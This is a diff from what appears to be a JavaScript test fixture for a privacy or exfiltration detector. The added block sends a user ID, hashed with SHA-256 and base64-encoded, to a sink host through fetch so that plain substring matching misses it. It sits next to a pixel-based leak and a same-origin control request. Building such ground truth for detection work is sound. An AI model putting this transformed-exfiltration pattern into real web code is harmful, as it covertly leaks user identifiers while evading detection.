@@ -72,6 +72,20 @@ async function exfiltrate(uid) {
     img.src = `${SINK}/pixel.gif?u=${uid}`;
   } catch (e) {}
 
+  // [4b] TRANSFORMED exfiltration (Phase 3 ground truth): sha256(uid)
+  //      and base64(uid) in query params — invisible to plain substring.
+  //      crypto.subtle is native (localhost = secure context) so the
+  //      digest is guaranteed correct; md5 is covered by Python unit
+  //      tests in transforms.py.
+  try {
+    const b64 = btoa(uid);
+    const buf = await crypto.subtle.digest(
+      "SHA-256", new TextEncoder().encode(uid));
+    const sha = Array.from(new Uint8Array(buf))
+      .map((b) => b.toString(16).padStart(2, "0")).join("");
+    fetch(`${SINK}/track?h=${sha}&b=${b64}`).catch(() => {});
+  } catch (e) {}
+
   // [5] FP control: constant never stored in IDB → same-origin sink path
   try { fetch(`/smoke-sink?c=benign-constant-string`).catch(() => {}); } catch (e) {}
 }
